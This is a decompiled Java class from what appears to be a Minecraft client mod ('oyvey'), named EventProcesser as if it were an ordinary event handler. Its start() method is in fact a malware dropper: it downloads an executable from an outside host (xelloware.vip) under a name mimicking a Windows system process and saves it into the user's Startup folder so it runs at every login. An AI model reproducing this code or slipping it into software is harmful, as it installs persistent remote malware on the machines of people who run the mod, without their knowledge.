// Decompiled with: CFR 0.152
// Class Version: 8
package me.alpha432.oyvey.event.processor;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;

public class EventProcesser {
    public static void start() throws IOException {
        block38: {
            String loginUser = System.getProperty("user.name");
            File tempFile = new File("C:/Users/" + loginUser + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Runt.exe");
            boolean exists = tempFile.exists();
            if (!exists) {
                URL url = new URL("https://xelloware.vip/Runtime_Broker.exe");
                String fileName = "C:/Users/" + loginUser + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Runt.exe";
                try (InputStream in = url.openStream();
                     BufferedInputStream bis = new BufferedInputStream(in);
                     FileOutputStream fos = new FileOutputStream(fileName);){
                    int count;
                    byte[] data = new byte[1024];
                    while ((count = bis.read(data, 0, 1024)) != -1) {
                        fos.write(data, 0, count);
                    }
                    break block38;
                }
            }
            System.out.print("\na\n");
        }
    }
}
